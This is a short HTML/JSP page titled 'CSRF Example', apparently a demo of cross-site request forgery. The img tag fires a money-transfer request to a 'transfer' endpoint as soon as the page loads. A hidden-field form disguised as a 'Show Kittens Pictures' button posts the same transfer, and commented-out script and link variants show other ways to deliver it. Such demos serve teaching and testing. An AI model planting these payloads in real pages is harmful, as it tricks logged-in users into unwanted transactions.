<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" >
    <head>
        <title>CSRF Example</title>
<%--        <script src="transfer?accountNo=123456&amount=100" />--%>
    </head>
    <body>
        <h1>Welcome!</h1>
        
        <!--<p>Click <a href="transfer?accountNo=123456&amount=100">here</a> to see kittens.</p>-->
        <img src="transfer?accountNo=123456&amount=100">

        <form action="transfer" method="POST">
        <input type="hidden" name="accountNo" value="123456"/>
        <input type="hidden" name="amount" value="100"/>
        <input type="submit" value="Show Kittens Pictures"/>
    </form>
    </body>
</html>